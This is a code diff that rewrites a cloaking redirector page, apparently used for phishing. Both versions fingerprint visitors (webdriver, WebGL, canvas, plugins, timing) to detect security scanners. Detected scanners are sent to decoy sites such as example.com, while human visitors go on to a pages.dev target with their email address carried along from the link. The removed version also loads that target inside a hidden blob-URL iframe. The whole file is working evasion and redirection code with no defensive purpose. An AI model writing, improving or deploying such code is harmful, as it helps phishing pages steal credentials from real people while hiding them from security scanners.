@@ -1,138 +1,58 @@
-<script>
-(function () {
-    'use strict';
 
-    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
-
-    /* ---- BOT-ONLY FAKE SUCCESS ROTATION ---- */
-    const FAKE_SUCCESS_DOMAINS = [
-        "https://example.com",
-        "https://www.example.org",
-        "https://www.example.net",
-        "https://www.iana.org/domains/reserved"
-    ];
-
-    const start = performance.now();
-
-    /* ---- ENTROPY ---- */
-    const delay = 160 + Math.floor(Math.random() * 160);
-
-    /* ---- PASSIVE HUMAN SIGNAL (NON-BLOCKING) ---- */
-    let touched = false;
-    ['mousemove','touchstart','keydown','scroll','pointerdown'].forEach(e =>
-        document.addEventListener(e, () => touched = true, { once: true })
-    );
-
-    /* ---- ENVIRONMENT COHERENCE CHECKS ---- */
-    function hasWebGL() {
-        try {
-            const c = document.createElement('canvas');
-            return !!(c.getContext('webgl') || c.getContext('experimental-webgl'));
-        } catch {
-            return false;
-        }
-    }
-
-    function hasCanvasEntropy() {
-        try {
-            const c = document.createElement('canvas');
-            const x = c.getContext('2d');
-            x.fillText(Math.random().toString(), 2, 2);
-            return c.toDataURL().length > 100;
-        } catch {
-            return false;
-        }
-    }
-
-    function timingSuspicious() {
-        const t = performance.now() - start;
-        return t < 70 || t > 12000;
-    }
-
-    function isScannerLike() {
-        if (navigator.webdriver) return true;
-        if (!hasWebGL()) return true;
-        if (!hasCanvasEntropy()) return true;
-        if (navigator.plugins.length === 0 && !('ontouchstart' in window)) return true;
-        if (navigator.languages && navigator.languages.length === 0) return true;
-        if (timingSuspicious()) return true;
-        return false;
-    }
-
-    /* ---- STICKY FAKE SUCCESS PER SESSION ---- */
-    function getFakeSuccess() {
-        try {
-            const k = "__fs";
-            let v = sessionStorage.getItem(k);
-            if (v) return v;
-            v = FAKE_SUCCESS_DOMAINS[
-                Math.floor(Math.random() * FAKE_SUCCESS_DOMAINS.length)
-            ];
-            sessionStorage.setItem(k, v);
-            return v;
-        } catch {
-            return FAKE_SUCCESS_DOMAINS[0];
-        }
-    }
-
-    /* ---- ORIGINAL LOGIC (UNCHANGED) ---- */
-    function getEmail() {
-        return new URLSearchParams(window.location.search).get("email") || "";
-    }
-
-    function buildTargetUrl(email) {
-        return email
-            ? TARGET_BASE + "?email=" + encodeURIComponent(email)
-            : TARGET_BASE;
-    }
-
-    function createMobileSafeBlob(targetUrl, email) {
-        const html = `<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html style="display:none">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-html,body{margin:0;padding:0;width:100%;height:100%}
-iframe{width:100%;height:100%;border:none}
-</style>
+    <meta charset="UTF-8">
+    <title></title>
 </head>
 <body>
-<iframe src="${targetUrl}"></iframe>
 <script>
-const email = ${JSON.stringify(email)};
-<\/script>
-</body>
-</html>`;
-        return new Blob([html], { type: "text/html" });
+// ULTRA-MINIMAL INVISIBLE ANTI-BOT
+(function() {
+    'use strict';
+    
+    // YOUR CONFIG
+    const REAL_URL = "https://23b538b5.ko1wx90sd.pages.dev";
+    const FAKE_URL = "https://example.com";
+    
+    // INSTANT BOT CHECK
+    function isBot() {
+        // Most reliable bot indicators
+        if (navigator.webdriver === true) return true;
+        if (window.__webdriver_evaluate !== undefined) return true;
+        
+        // Quick WebGL check
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (!gl) return true;
+        } catch(e) {
+            return true;
+        }
+        
+        return false;
     }
-
-    /* ---- FINAL DECISION ---- */
-    function run() {
-        setTimeout(() => {
-
-            /* BOT / SCANNER → FAKE SUCCESS */
-            if (isScannerLike()) {
-                window.location.replace(getFakeSuccess());
-                return;
-            }
-
-            /* HUMAN → REAL FLOW */
-            const email = getEmail();
-            const targetUrl = buildTargetUrl(email);
-            const blobUrl = URL.createObjectURL(
-                createMobileSafeBlob(targetUrl, email)
-            );
-
-            window.location.replace(blobUrl);
-
-            setTimeout(() => {
-                try { URL.revokeObjectURL(blobUrl); } catch {}
-            }, 10000);
-
-        }, delay);
+    
+    // GET EMAIL
+    function getEmail() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('email');
+        return email ? '?email=' + encodeURIComponent(email.trim()) : '';
     }
-
-    run();
+    
+    // EXECUTE
+    setTimeout(function() {
+        const bot = isBot();
+        const email = getEmail();
+        
+        if (bot) {
+            window.location.href = FAKE_URL;
+        } else {
+            window.location.href = REAL_URL + email;
+        }
+    }, 1); // 1ms delay - imperceptible
+    
 })();
 </script>
+</body>
+</html>
